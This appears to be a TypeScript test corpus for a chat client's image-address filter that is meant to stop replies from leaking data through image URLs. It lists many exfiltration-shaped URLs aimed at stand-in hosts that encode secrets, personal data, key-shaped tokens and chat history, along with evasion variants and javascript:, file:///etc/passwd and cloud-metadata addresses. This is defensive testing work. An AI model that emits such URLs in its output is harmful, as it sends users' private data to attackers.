    "https://media.wired.com/photos/6afce67e8d4d47192101a96f/1:1/w_1024%2Cc_limit/Germ%2520Network.jpg",
    "https://media.pitchfork.com/photos/6af5f3f605ae8a8ec42748c2/1:1/pass/Armand%2520Hammer%2520-%2520Snakes%2520&%2520Ladders%2520album%2520art.jpg",
    "https://assets.bonappetit.com/photos/6aba86749853dd3ec8f97c28/1:1/w_1280%2Cc_limit/BA%25202026%2520Thanksgiving_Pear_01.jpg",
    "https://e.example/photos/Annual%2520report%2520draft%2520do%2520not%2520share.jpg",
  ],
};

/** Addresses shaped to carry data out: every one must ask. */
const MUST_ASK: Record<string, string[]> = {
  "encoded text in the query": [
    `https://evil.example/a.png?d=${b64(SECRET)}`,
    `https://evil.example/a.png?d=${b64url(`${SECRET}?>`)}`,
    `https://evil.example/a.png?d=${encodeURIComponent(b64(`${SECRET} >>?`))}`,
    `https://evil.example/a.png?h=${hex("api key for prod is hunter2")}`,
    `https://evil.example/logo.png?v=${b64url("ssn 123-45-6789")}`,
    `https://cdn.evil.example/img.jpg?w=800&q=80&sig=${b64url("meeting notes: layoffs planned")}`,
    `https://evil.example/a.png?${b64url(SECRET)}=1`,
    `https://evil.example/a.png?d=${b64(b64("password is hunter2 for jordan"))}`,
    `https://evil.example/a.png?d=${b64(JSON.stringify({ user: "jordan", balance: 48213 }))}`,
  ],
  "encoded text in the path": [
    `https://evil.example/img/${b64url(SECRET)}.png`,
    `https://evil.example/${hex("user password is hunter2 ok!!!!!")}.png`,
    `https://evil.example/avatar/${hex("jordan@examp.com")}`,
    `https://evil.example/a.${b64url(SECRET)}`,
    `https://evil.example/a.png;d=${b64url(SECRET)}`,
    `https://evil.example/assets/logo-${hex("secret: 4821")}.png`,
  ],
  "opaque blobs (encrypted or compressed data)": [
    `https://evil.example/a.png?d=${noiseB64url(66, 21)}`,
    `https://evil.example/a.png?d=${noiseHex(48, 22)}`,
    `https://evil.example/c/${noiseHex(50, 23)}/p.gif`,
    `https://evil.example/i/${noiseB64url(60, 24)}.jpg`,
    `https://evil.example/a.png?token=${noiseB64url(96, 25)}`,
    `https://evil.example/a.png?k=${"MFRGGZDFMZTWQ2LKNNWG23TPOBYXE43UOV3HO6DZPIYTEMZUGU3DOOBZ".repeat(2)}`,
    `https://evil.example/${noiseHex(32, 26).replace(/[a-f]/g, (c, i: number) => (i % 2 ? c.toUpperCase() : c))}.png`,
    `https://evil.example/a.png?n=${"3141592653589793238462643383279502884197169399375105820974944592307816406286208998628034825342117067982148086513282306647".slice(0, 96)}`,
    `https://evil.example/${[1, 2, 3, 4, 5, 6].map((seed) => noiseHex(16, 30 + seed)).join("/")}.png`,
    `https://evil.example/p.png?a=${noiseHex(16, 41)}&b=${noiseHex(16, 42)}&c=${noiseHex(16, 43)}&d=${noiseHex(16, 44)}&e=${noiseHex(16, 45)}&f=${noiseHex(16, 46)}`,
  ],
  "split blobs": [
    `https://evil.example/a/${chunks(b64url(SECRET), 20).join("/")}.png`,
    `https://evil.example/${chunks(b64url(SECRET), 20).join(".")}.png`,
    `https://evil.example/x.png?${chunks(b64url(SECRET), 14).map((part, i) => `p${i}=${part}`).join("&")}`,
    `https://evil.example/x.png?${chunks(noiseB64url(60, 51), 12).map((part, i) => `p${i}=${part}`).join("&")}`,
    `https://evil.example/${chunks(noiseB64url(72, 52), 16).join("/")}/x.png`,
    `https://evil.example/${chunks(b64url(SECRET), 12).join("~")}`,
    `https://evil.example/${chunks(b64url(SECRET), 12).join(",")}`,
    `https://evil.example/t.gif?a=${chunks(hex("card 4929 1837 2650 7714"), 16).join("&b=")}`,
    `https://evil.example/${hex("hello secret wor").replace(/^(.{8})(.{4})(.{4})(.{4})(.{12})$/, "$1-$2-$3-$4-$5")}.png`,
  ],
  "text in the address": [
    "https://evil.example/a.png?q=the%20users%20password%20is%20hunter2%20and%20email%20is%20bob",
    "https://evil.example/a.png?q=jordan+lives+at+12+main+street+springfield",
    "https://evil.example/a.png?note=salary_is_120000_and_bonus_is_30000_per_year",
    "https://evil.example/a.png?t=TheUsersSalaryIsOneHundredThousandDollars",
    "https://evil.example/log?m=meeting.notes.layoffs.planned.for.january.keep.quiet",
    "https://evil.example/p.png?a=jordan&b=lee&c=salary&d=120000&e=ssn&f=123&g=45&h=6789&i=acct&j=998877&k=pin&l=4321",
    "https://evil.example/the/users/secret/project/is/called/bluebird/and/launches/in/march/with/twelve/engineers/from/payments/team/plus/four/contractors/budget/was/approved/by/finance/last/week/after/long/review/meeting/notes/attached.png",
    "https://evil.example/zebra-quartz-violin-harbor-meadow-copper-lantern-orchid-falcon-timber-saffron-glacier-pebble-walnut-crimson-anchor-thistle-marble-ember-juniper-willow-cobalt-prairie-magnet-velvet-summit-cactus-ribbon-tunnel-bishop-canyon-dragon-puzzle.png",
    `https://evil.example/a.png?d=${encodeURIComponent(JSON.stringify({ name: "Jordan", ssn: "123-45-6789" }))}`,
    "https://evil.example/a.png?prompt=summarize+my+private+notes+about+the+acquisition",
    "https://evil.example/a.png?history=user%3A+what+is+my+balance%0Aassistant%3A+48213",
    `https://evil.example/${"lorem-ipsum-dolor-sit-amet/".repeat(24)}a.png`,
  ],
  "personal data and secrets": [
    "https://evil.example/p.gif?e=jordan@example.com",
    "https://evil.example/p.gif?e=jordan%40example.com&n=Jordan",
    "https://evil.example/u/jordan.lee@example.com/avatar.png",
    // Made-up values in the shapes of keys and tokens, put together here so that no key-shaped literal sits in the source.
    `https://evil.example/a.png?t=${["eyJhbGciOiJIUzI1NiJ9", "eyJzdWIiOiIxMjM0NTY3ODkwIn0", "dBjftJeZ4CVPmB92K27uhbUJU1p1r_wW1gFWFOEjXk"].join(".")}`,
    `https://evil.example/a.png?k=${["sk", "proj", "Xk3p9Qw7Rm2Tz8LbN4cWfYd6"].join("-")}`,
    `https://evil.example/a.png?k=${["ghp", "Xk3p9Qw7Rm2Tz8LbN4cWfYd6HsEuGi1Ko5Ma"].join("_")}`,
    "https://evil.example/a.png?k=AKIAIOSFODNN7EXAMPLE",
    `https://evil.example/a.png?k=${["xoxb", "123456789012", "1234567890123", "Xk3p9Qw7Rm2Tz8LbN4cWfYd6"].join("-")}`,
    `https://evil.example/a.png?pem=${["-----BEGIN", "PRIVATE", "KEY-----MIIEvQ"].join("%20")}`,
  ],
  "data in the host name": [
    `https://${hex("jordan pay is 120000")}.evil.example/a.png`,
    `https://${noiseHex(20, 61)}.evil.example/a.png`,
    "https://mfrggzdfmztwq2lknnwg23tpobyxe43uov3ho6dzpiytemzu.evil.example/a.png",
    `https://${chunks(hex("hello world secret"), 12).join(".")}.evil.example/a.png`,
    `https://${chunks(noiseHex(24, 62), 8).join(".")}.evil.example/a.png`,
    "https://a1.b2.c3.d4.e5.f6.g7.evil.example/a.png",
    "https://the.users.salary.is.high.evil.example/a.png",
    "https://jordan-salary-is-high-ssn-follows-soon.evil.example/a.png",
    "https://q7w1e9r3t5y2u8i4.o6p0a2s4d6f8g1h3.evil.example/a.png",
    `https://${noiseHex(8, 63)}.${noiseHex(8, 64)}.${noiseHex(8, 65)}.t.evil.example/a.png`,
  ],
  "ip-literal and private hosts": [
    "https://203.0.113.9/a.png",
    "https://1.2.3.4/a.png",
    "https://16909060/a.png",
    "https://0x1020304/a.png",
    "https://0300.0250.0001.0001/a.png",
    "https://3232235777/a.png",
    "http://017700000001/a.png",
    "https://192.168.1.1/admin/logo.png",
    "https://10.0.0.5/a.png",
    "http://127.0.0.1:8080/a.png",
    "https://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "https://[::1]:8443/a.png",
    "https://[2001:db8:dead:beef:1234:5678:9abc:def0]/a.png",
    "https://[::ffff:10.0.0.1]/a.png",
    "https://[fd12:3456:789a::1]/a.png",
    "http://localhost:3000/a.png",
    "https://router.local/logo.png",
    "https://intranet/logo.png",
    "https://build.corp.internal/badge.svg",
  ],
  credentials: [
    "https://user:pw@evil.example/a.png",
    "https://user@evil.example/a.png",
    "https://jordan%40example.com:hunter2@evil.example/a.png",
    "https://i.imgur.com@evil.example/AbCd123.png",
    "https://c2VjcmV0@evil.example/a.png",
  ],
  "redirects and addresses inside the address": [
    "https://example.com/login?redirect=https://evil.example/c.png",
    "https://example.com/a.png?next=//evil.example/a",
    "https://example.com/go?goto=https%3A%2F%2Fevil.example%2Fa.png",
    "https://example.com/auth?continue=https://evil.example/",
    "https://example.com/a.png?return_to=https%3A%2F%2Fevil.example",
    "https://example.com/a.png?RedirectUrl=https://evil.example/a.png",
    "https://example.com/a.png?dest=HtTpS://evil.example/a",
    "https://www.google.com/url?q=https://evil.example/a.png&sa=D",
    "https://example.com/out?u=https://evil.example/a.png",
    "https://example.com/a.png?url=https%253A%252F%252Fevil.example%252Fa.png",
    "https://example.com/a.png?u=ht%09tps:%09//evil.example",
    "https://example.com/a.png?u=%5C%5Cevil.example",
    "https://example.com/a.png?u=%EF%BC%8F%EF%BC%8Fevil.example",
    "https://example.com/a.png?u=ftp:evil.example",
    "https://example.com/a.png?url=javascript:alert(1)",
    "https://example.com/proxy/https://a.example/fetch?url=https://evil.example/x.png",
    `https://img.shields.io/endpoint?url=https://evil.example/${b64url(SECRET)}`,
    `https://example.com/_next/image?url=${encodeURIComponent(`https://evil.example/a.png?d=${b64(SECRET)}`)}&w=640&q=75`,
    `https://images.unsplash.com/photo-1503023345310-bd7c1de61c7d?mark64=${b64url(`https://evil.example/a.png?d=${b64(SECRET)}`)}`,
    `https://camo.example/${SHA1}/${hex(`https://evil.example/a.png?d=${noiseB64url(60, 77)}`)}`,
    "https://res.cloudinary.com/demo/image/fetch/https://203.0.113.9/a.png",
    `https://example.com/image/fetch/https%3A%2F%2Fuser%3Apw%40evil.example%2Fa.png`,
  ],
  "tracking patterns": [
    `https://evil.example/pixel.gif?uid=884213&e=${noiseHex(24, 71)}`,
    `https://track.evil.example/open?m=${noiseB64url(40, 72)}`,
    `https://evil.example/collect?cid=${noiseHex(12, 73)}&utm_source=chat&utm_campaign=${noiseB64url(30, 74)}`,
    `http://evil.example:8081/beacon?session=${noiseHex(14, 75)}`,
  ],
  "look-alike international names": [
    "https://аpple.com/logo.png",
    "https://xn--80ak6aa92e.com/logo.png",
    "https://gооgle.com/logo.png",
    "https://tinyсloud.xyz/logo.png",
    "https://αpple.com/logo.png",
    "https://xn--pple-43d.com/a.png",
  ],
  "many parameters and unusual ports": [
    `https://evil.example/a.png?${Array.from({ length: 18 }, (_, i) => `p${i}=${i * 7}`).join("&")}`,
    `https://evil.example/a.png?${Array.from({ length: 14 }, (_, i) => `k${i}=${noiseHex(6, 80 + i)}`).join(";")}`,
    `http://evil.example:31337/a.png?id=${noiseB64url(22, 76)}`,
    `https://evil.example:4444/p.png?${Array.from({ length: 10 }, (_, i) => `v${i}=${i}`).join("&")}&x=jordan&y=lee`,
  ],
  "request-capture services": [
    `https://webhook.site/${UUID_A}`,
    "https://x7k2m9p4.ngrok-free.app/a.png",
    "https://c8a1b2.oast.fun/a.png",
    "https://eo1a2b3c4d5e6f7.m.pipedream.net/a.png",
    "https://abc.burpcollaborator.net/a.png",
    "https://quick-brown-fox.trycloudflare.com/p.png",
  ],
  "evasions: encoding and case": [
    `https://evil.example/a.png?d=${encodeURIComponent(encodeURIComponent(b64(`${SECRET} >>?`)))}`,
    `https://evil.example/a.png?d=${encodeURIComponent(encodeURIComponent(noiseB64(45, 81)))}`,
    `https://evil.example/a.png?d=${Array.from("secret", (char) => `%${char.charCodeAt(0).toString(16)}`).join("")}`,
    `https://evil.example/a.png?d=${Array.from(b64url("jordan's pin is 4321"), (char) => `%${char.charCodeAt(0).toString(16).toUpperCase()}`).join("")}`,
    `HTTPS://EVIL.EXAMPLE/a.png?d=${b64url(SECRET)}`,
    `hTtPs://Evil.Example/A.PNG?D=${hex("the pin is 4321").toUpperCase()}`,
    `https://evil.example/a.png?d=${hex("mixed case hex payload").replace(/[a-f]/g, (c, i: number) => (i % 3 ? c.toUpperCase() : c))}`,
    `https://evil.example/a.png?d=${chunks(b64(SECRET), 30).join("%0A")}`,
    `https://evil.example/a.png?d=${chunks(b64(SECRET), 30).join("%20")}`,
    `https:\\\\evil.example\\a.png?d=${noiseB64url(24, 82)}`,
    `https:evil.example/a.png?d=${noiseB64url(24, 83)}`,
    `https://evil.example./a.png?d=${b64url(SECRET)}`,
    `https://evil.example/a.png?d=${noiseB64url(30, 84)}%00%ff`,
    `https://evil\u200b.example/a.png?d=${noiseB64url(24, 85)}`,
    `  https://evil.example/a.png?d=${b64url(SECRET)}  `,
    `https://xn--mnchen-3ya.evil.example:8444/a.png?d=${noiseB64url(22, 86)}`,
  ],
  "forged signed urls": [
    `https://evil.s3.amazonaws.com/a.png?${SIGV4}&X-Amz-Signature=${hex("the balance is 48213 dollars ok!")}`,
    `https://evil.s3.amazonaws.com/a.png?${SIGV4}&X-Amz-Signature=${noiseHex(32, 91)}&X-Amz-Security-Token=${noiseB64url(120, 92)}`,
    `https://evil.s3.amazonaws.com/a.png?${SIGV4}&X-Amz-Signature=${noiseHex(48, 93)}`,
    `https://evil.s3.amazonaws.com/a.png?${SIGV4}&X-Amz-Signature=${noiseHex(32, 94)}&X-Amz-Signature=${noiseHex(48, 95)}`,
    `https://evil.s3.amazonaws.com/a.png?${SIGV4.replace("host", b64url(SECRET).toLowerCase())}&X-Amz-Signature=${noiseHex(32, 96)}`,
    `https://d111111abcdef8.cloudfront.net/a.png?Expires=1767225600&Signature=${b64url(SECRET.repeat(5)).slice(0, 344)}&Key-Pair-Id=K2JCJMDEHXQW5F`,
    `https://evil.blob.core.windows.net/a/b.png?sv=2023-11-03&se=2026-11-18T12%3A00%3A00Z&sr=b&sp=r&sig=${encodeURIComponent(b64("the pin is 4321 and code is 9911").slice(0, 44))}`,
  ],
  "bytes around an address inside the address": [
    `https://e.example/x?u=${base62(20000, 111)}https://wikipedia.org/a.png`,
    `https://e.example/x?u=https://wikipedia.org/a.png%23${base62(20000, 112)}`,
    `https://e.example/x?u=https://wikipedia.org/${base62(20000, 113)}/../a.png`,
    `https://e.example/x?u=https://wikipedia.org/${base62(200, 114)}/%252e%252e/a.png`,
    `https://e.example/x?u=https%3A%2F%2Fwikipedia.org%2Fa.png%23${base62(60, 115)}`,
    `https://e.example/fetch/x${base62(40, 116)}https://wikipedia.org/a.png`,
    `https://e.example/x?u=${b64(`${String.fromCharCode(...noise(60, 117).map((byte) => byte | 0x80))}https://wikipedia.org/a.png`)}`,
  ],
  "characters outside ASCII": [
    `https://e.example/${base62(298, 121)}é`,
    `https://e.example/${base62(590, 122)}é`,
    `https://e.example/${cjk(299, 123)}`,
    `https://e.example/${cjk(599, 124)}`,
    `https://e.example/${encodeURIComponent(cjk(140, 125))}.png`,
    "https://attacker.example/thepasswordishunter2andherbankpinis4471andthesafecodeis9921é.png",
    "https://attacker.example/парольотпочтыхантердваибанковскийпинчетыречетыресемьодинкодотсейфадевятьдевятьдваодин.png",
    `https://e.example/a.png?v=${base62(60, 126)}é`,
  ],
  "bytes under a second layer of encoding": [
    // Bytes that are not text (0x80-0xBF), each written %25XX.
    `https://e.example/${noise(280, 131).map((byte) => `%25${(0x80 | (byte & 0x3f)).toString(16).toUpperCase()}`).join("")}`,
    `https://e.example/${noise(590, 132).map((byte) => `%25${(0x80 | (byte & 0x3f)).toString(16).toUpperCase()}`).join("")}`,
    `https://e.example/a.png?d=${noise(64, 133).map((byte) => `%25${(0x80 | (byte & 0x3f)).toString(16)}`).join("")}`,
    // Any doubly-encoded byte but a space: a letter, a hyphen, a slash, a line break, a third layer.
    "https://e.example/photos/Annual%2520report%2520draft%2541.jpg",
    "https://e.example/photos/Annual%252Dreport%252Ddraft.jpg",
    "https://e.example/photos/Annual%2520report%252Fdraft.jpg",
    "https://e.example/photos/Annual%2520report%250Adraft.jpg",
    "https://e.example/photos/Annual%252520report.jpg",
    // Bytes that are not UTF-8.
    `https://e.example/${noise(120, 134).map((byte) => `%E${(byte & 0xf).toString(16)}%B${((byte >> 4) & 0xf).toString(16)}`).join("-")}.png`,
  ],
  // Random letters shaped like words, short query keys, the fields of a made-up signature, digits in host labels.
  "long addresses of ordinary-looking pieces": [
    `https://e.example/${madeUpWords(15, 24, 141).join("-")}.png`,
    `https://e.example/${madeUpWords(24, 11, 142).join("-")}.png`,
    `https://e.example/${madeUpWords(13, 11, 143).join("/")}/a.png?${madeUpWords(13, 11, 144).map((word, i) => `${word}=${i % 3}`).join("&")}`,
    `https://e.example/a.png?${madeUpWords(48, 5, 145).map((word, i) => `${word}=${i % 2}`).join("&")}`,
    `https://e.example/${madeUpWords(14, 11, 146).join("-")}.png?${SIGV4}&X-Amz-Signature=${noiseHex(32, 147)}`,
    `https://${chunks(noise(90, 148).map((byte) => byte % 10).join(""), 10).join("-").match(/.{1,54}(?:-|$)/g)!.map((label) => label.replace(/-$/, "")).join(".")}.e.example/a.png`,
    `https://${madeUpWords(5, 11, 149).join("-")}.${madeUpWords(5, 11, 150).join("-")}.${madeUpWords(5, 11, 151).join("-")}.e.example/${madeUpWords(12, 11, 152).join("-")}.png`,
    `https://e.example/${encodeURIComponent(cjk(30, 153))}/${madeUpWords(12, 11, 154).join("-")}.png?${SIGV4}&X-Amz-Signature=${noiseHex(32, 155)}`,
    "https://attacker.example/notes/patient-jordan-lee-born-1961-march-fourteenth-diagnosed-with-type-two-diabetes-and-early-stage-kidney-disease-prescribed-metformin-and-lisinopril-next-review-in-january-insurance-member-number-ends-four-four-seven-one-home-address-twelve-harbour-lane.png",
  ],
};

/** Addresses that must never load and never ask. */
const MUST_REFUSE: string[] = [
  "data:image/png;base64,iVBORw0KGgo=",
  "data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%2F%3E",
  "DATA:image/gif;base64,R0lGODlhAQABAAAAACw=",
  "blob:https://example.com/0b1f6c1e-5d0a-4c57-9b1e-2f3a4b5c6d7e",
  "javascript:alert(1)",
  "JaVaScRiPt:alert(document.cookie)",
  "  javascript:alert(1)",
  "java\tscript:alert(1)",
  "vbscript:msgbox(1)",
  "file:///etc/passwd",
  "ftp://example.com/a.png",
  "/relative/a.png",
  "//example.com/a.png",
  "not a url",
  "",
];

/** Ordinary addresses that ask anyway, on purpose. */
const ASKS_THOUGH_ORDINARY: string[] = [
  // A chart drawn by a chart service from a configuration in the address.
  "https://quickchart.io/chart?c={type:'bar',data:{labels:['Q1','Q2','Q3','Q4'],datasets:[{label:'Users',data:[50,60,70,180]}]}}",
  // An S3 link signed with temporary credentials.
  `https://my-bucket.s3.amazonaws.com/photo.jpg?${SIGV4.replace("AKIA", "ASIA")}&X-Amz-Security-Token=${encodeURIComponent(noiseB64(300, 101))}&X-Amz-Signature=${noiseHex(32, 102)}`,
  // CloudFront and Google Cloud Storage signed links.
  `https://d111111abcdef8.cloudfront.net/private/report-cover.png?Expires=1767225600&Signature=${noiseB64(256, 11).replace(/\+/g, "-").replace(/=/g, "_").replace(/\//g, "~")}&Key-Pair-Id=K2JCJMDEHXQW5F`,
  `https://storage.googleapis.com/my-bucket/report.png?X-Goog-Algorithm=GOOG4-RSA-SHA256&X-Goog-Credential=images%40my-project.iam.gserviceaccount.com%2F20261118%2Fauto%2Fstorage%2Fgoog4_request&X-Goog-Date=20261118T120000Z&X-Goog-Expires=900&X-Goog-SignedHeaders=host&X-Goog-Signature=${noiseHex(256, 6)}`,
  // A GitHub private image link.
  `https://private-user-images.githubusercontent.com/583231/${UUID_A}.png?jwt=${[b64url('{"typ":"JWT","alg":"HS256"}'), b64url('{"iss":"github.com","aud":"raw.githubusercontent.com"}'), noiseB64url(32, 103)].join(".")}`,
  // An OpenAI image link on Azure.
  `https://oaidalleapiprodscus.blob.core.windows.net/private/org-Xk3p9Qw7Rm2Tz8LbN4cWfYd6/user-Hs1EuGi6Ko5MaXjZt0BqVnCy/img-PlOe7Qm2Rk9TzLp4VbN8cWfY.png?st=2026-11-18T10%3A00%3A00Z&se=2026-11-18T12%3A00%3A00Z&sp=r&sv=2023-11-03&sr=b&rscd=inline&rsct=image/png&sig=${encodeURIComponent(noiseB64(32, 104))}`,
  // A subdomain IPFS gateway.
  "https://bafybeigdyrzt5sfp7udm7hu76uh7y26nf3efuylqabf3oclgtqy55fbzdi.ipfs.dweb.link/cat.jpg",
];

const describeVerdict = (src: string) => {
  const verdict = imageUrlVerdict(src);
  const score = verdict.kind === "block" ? "" : ` ${verdict.score}`;
  return `${verdict.kind}${score} [${verdict.reasons.map((reason) => `${reason.code}:${reason.weight}`).join(", ")}] ${src}`;
};

describe("image address corpus", () => {
  const mustLoad = Object.values(MUST_LOAD).flat();
  const mustAsk = Object.values(MUST_ASK).flat();
  const falsePositives = mustLoad.filter((src) => imageUrlVerdict(src).kind !== "load");
  const falseNegatives = mustAsk.filter((src) => imageUrlVerdict(src).kind !== "ask");
  const notRefused = MUST_REFUSE.filter((src) => imageUrlVerdict(src).kind !== "block");
  const knownLoading = ASKS_THOUGH_ORDINARY.filter((src) => imageUrlVerdict(src).kind !== "ask");

  console.log(
    `image address corpus: ${mustLoad.length} must load, ${falsePositives.length} do not; ` +
      `${mustAsk.length} must ask, ${falseNegatives.length} do not; ` +
      `${MUST_REFUSE.length} must be refused, ${notRefused.length} are not; ` +
      `${ASKS_THOUGH_ORDINARY.length} ordinary addresses ask on purpose, ${knownLoading.length} of them now load`,
  );

  test("is large enough and has no address twice", () => {
    expect(mustLoad.length).toBeGreaterThanOrEqual(150);
    expect(mustAsk.length).toBeGreaterThanOrEqual(100);
    const all = [...mustLoad, ...mustAsk, ...MUST_REFUSE, ...ASKS_THOUGH_ORDINARY];
    expect(all.filter((src, i) => all.indexOf(src) !== i)).toEqual([]);
  });

  test("every ordinary image address loads", () => {
    expect(falsePositives.map(describeVerdict)).toEqual([]);
  });

  test("every address shaped to carry data asks", () => {
    expect(falseNegatives.map(describeVerdict)).toEqual([]);
  });

  test("data:, blob:, javascript: and other non-web addresses are refused", () => {
    expect(notRefused.map(describeVerdict)).toEqual([]);
  });

  test("the ordinary addresses that ask on purpose still ask: move one to the must-load list when the filter learns its shape", () => {
    expect(knownLoading.map(describeVerdict)).toEqual([]);
  });

  test("every verdict explains itself: an ask names its reasons, and they add up to its score", () => {
    for (const src of [...mustLoad, ...mustAsk]) {
      const verdict = imageUrlVerdict(src);
      if (verdict.kind === "block") continue;
      expect(verdict.reasons.reduce((sum, reason) => sum + reason.weight, 0)).toBe(verdict.score);
      if (verdict.kind === "ask") expect(verdict.reasons.length).toBeGreaterThan(0);
      for (const reason of verdict.reasons) expect(reason.detail).not.toBe("");
    }
  });
});

// Whole replies (imageBudget.ts).

const wiki = (name: string) => `https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/${name}.jpg/640px-${name}.jpg`;

/** Ordinary replies: no image may wait. */
const REPLIES_THAT_LOAD: Record<string, string[]> = {
  "five Wikimedia thumbnails": ["Golden_Gate_Bridge", "The_Starry_Night", "Mount_Everest_North_Face", "Tokyo_Tower_at_night", "Photosynthesis_diagram"].map(wiki),
  "one photo from each of five news sites": ["a", "b", "c", "d", "e"].map((name) => `https://www.${name}-times.example/images/2026/11/18/front-page-${name}-lead-photo-1200x800.jpg`),
  "a README: six badges and four avatars": [
    "https://img.shields.io/npm/v/react.svg?style=flat",
    "https://img.shields.io/github/license/facebook/react.svg",
    "https://img.shields.io/badge/build-passing-brightgreen.svg",
    "https://github.com/facebook/react/actions/workflows/runtime_build_and_test.yml/badge.svg",
    "https://codecov.io/gh/facebook/react/branch/main/graph/badge.svg",
    "https://img.shields.io/badge/PRs-welcome-brightgreen.svg",
    ...[583231, 9919, 69631, 1342004].map((id) => `https://avatars.githubusercontent.com/u/${id}?v=4&s=64`),
  ],
  "a shop: eight product photos from one CDN": ["front", "back", "side", "detail", "packaging", "lifestyle", "scale", "colours"].map(
    (view) => `https://cdn.shopify.com/s/files/1/0533/2089/files/blue-ceramic-mug-${view}_800x.jpg?v=1700000000`,
  ),
  "four Unsplash photos": ["1503023345310-bd7c1de61c7d", "1441974231531-c6227db76b6e", "1470071459604-3b5ec3a7fe05", "1447752875215-b2761acb3c5d"].map(
    (id) => `https://images.unsplash.com/photo-${id}?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&q=80`,
  ),
  "ten YouTube thumbnails": ["dQw4w9WgXcQ", "9bZkp7q19f0", "kJQP7kiw5Fk", "JGwWNGJdvx8", "OPf0YbXqDm0", "fJ9rUzIMcZQ", "RgKAFK5djSk", "hT_nvWreIhg", "CevxZvSJLk8", "YQHsXMglC9A"].map(
    (id) => `https://i.ytimg.com/vi/${id}/hqdefault.jpg`,
  ),
  "three signed S3 images from one bucket": [1, 2, 3].map((n) => `https://my-bucket.s3.us-east-1.amazonaws.com/uploads/2026/photo-${n}.jpg?${SIGV4}&X-Amz-Signature=${noiseHex(32, 160 + n)}`),
  "four images through a site's image optimiser": ["hero", "team", "office", "product"].map(
    (name) => `https://www.example.com/_next/image?url=${encodeURIComponent(`https://cdn.example.com/marketing/${name}.png`)}&w=1200&q=75`,
  ),
  "five Medium images": ["dmbNkD5D-u45r44go_cf0g", "Xk3p9Qw7Rm2Tz8LbN4cWfY", "Hs1EuGi6Ko5MaXjZt0BqVn", "PlOe7Qm2Rk9TzLp4VbN8cW", "Zt0BqVnCyHs1EuGi6Ko5Ma"].map(
    (id) => `https://miro.medium.com/v2/resize:fit:1400/1*${id}.png`,
  ),
  "twelve emoji from one CDN": ["1f600", "1f601", "1f602", "1f923", "1f603", "1f604", "1f605", "1f606", "1f609", "1f60a", "1f60b", "1f60e"].map(
    (code) => `https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/${code}.png`,
  ),
  "six images of ours": [1, 2, 3, 4, 5, 6].map((n) => `https://node.tinycloud.xyz/kv/photos/trip-${n}.jpg`),
  "a mixed answer: Wikipedia, a badge, GitHub and a blog": [
    wiki("Krebs_cycle"),
    "https://img.shields.io/badge/coverage-98%25-brightgreen.svg",
    "https://raw.githubusercontent.com/vercel/next.js/canary/docs/public/images/architecture-overview.png",
    "https://blog.example.org/wp-content/uploads/2026/11/quarterly-results-summary-chart-1024x576.png",
  ],
};

interface DataReply {
  srcs: string[];
  /** Bits in each address: characters times log2 of the alphabet they were drawn from. */
  carries: number;
}
const forged = (seed: number) =>
  `X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIA${noise(16, seed).map((byte) => "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"[byte % 32]).join("")}%2F20261118%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261118T120000Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=${noiseHex(32, seed + 1000)}`;
const times = <T>(count: number, make: (i: number) => T) => Array.from({ length: count }, (_, i) => make(i));

/** Replies of many addresses that each load on their own: some must wait. */
const REPLIES_THAT_HOLD: Record<string, DataReply> = {
  "thirty file names that are SHA-256 hashes": { srcs: times(30, (i) => `https://evil.example/${noiseHex(32, 200 + i)}.png`), carries: 256 },
  "a blob cut into forty pieces of 25 characters": { srcs: times(40, (i) => `https://evil.example/img/${base62(25, 300 + i)}.png`), carries: 25 * Math.log2(62) },
  "forty tenants of a free hosting service, a piece in each name and path": {
    srcs: times(40, (i) => `https://${madeUpWords(1, 12, 400 + i)[0]}.pages.dev/${base62(22, 500 + i)}.png`),
    carries: 12 * Math.log2(26) + 22 * Math.log2(62),
  },
  "forty unrelated domains, a piece in each": { srcs: times(40, (i) => `https://cdn.${madeUpWords(1, 9, 600 + i)[0]}.example/${base62(22, 700 + i)}.png`), carries: 9 * Math.log2(26) + 22 * Math.log2(62) },
  "sixty file names of twelve CJK ideographs": { srcs: times(60, (i) => `https://evil.example/${encodeURIComponent(cjk(12, 800 + i))}.png`), carries: 12 * Math.log2(0x5000) },
  "forty file names of six made-up words": { srcs: times(40, (i) => `https://evil.example/${madeUpWords(6, 11, 900 + i).join("-")}.png`), carries: 66 * Math.log2(26) },
  "twenty forged signatures": { srcs: times(20, (i) => `https://evil.example/a.png?${forged(1000 + i)}`), carries: 256 + 16 * 5 },
  "two hundred host names with twelve digits": {
    srcs: times(200, (i) => `https://${chunks(noise(12, 1100 + i).map((byte) => byte % 10).join(""), 4).join("-")}.evil.example/a.png`),
    carries: 12 * Math.log2(10),
  },
  "a hundred and fifty of the smallest addresses, four characters each": { srcs: times(150, (i) => `https://e.io/${base62(4, 1300 + i)}`), carries: 4 * Math.log2(62) },
  "sixty short query keys": { srcs: times(60, (i) => `https://evil.example/a.png?${madeUpWords(4, 6, 1500 + i).map((word, n) => `${word}=${n}`).join("&")}`), carries: 24 * Math.log2(26) },
  // A truncated UTF-8 sequence in each file name.
  "two hundred file names with one truncated UTF-8 sequence each": {
    srcs: times(200, (i) => `https://evil.example/a%E${(noise(1, 1700 + i)[0]! & 0xf).toString(16)}%${(0x80 | (noise(2, 1700 + i)[1]! & 0x3f)).toString(16)}.png`),
    carries: 10,
  },
  // A run of 36 UTF-16 units: four ideographs outside the basic plane and 28 inside it.
  "twelve addresses with two runs of ideographs as long as a UUID": {
    srcs: times(12, (i) => `https://e.example/${[0, 1].map((n) => encodeURIComponent(cjkExtensionB(4, 1900 + 2 * i + n) + cjk(28, 2000 + 2 * i + n))).join("/")}.png`),
    carries: 2 * (4 * 12 + 28 * Math.log2(0x5000)),
  },
};

describe("image address corpus: whole replies", () => {
  const ordinary = Object.entries(REPLIES_THAT_LOAD).map(([name, srcs]) => ({ name, srcs, held: heldImages(srcs) }));
  const data = Object.entries(REPLIES_THAT_HOLD).map(([name, { srcs, carries }]) => {
    const held = heldImages(srcs);
    return { name, srcs, held, silent: Math.ceil((srcs.length - held.length) * carries) };
  });

  console.log(
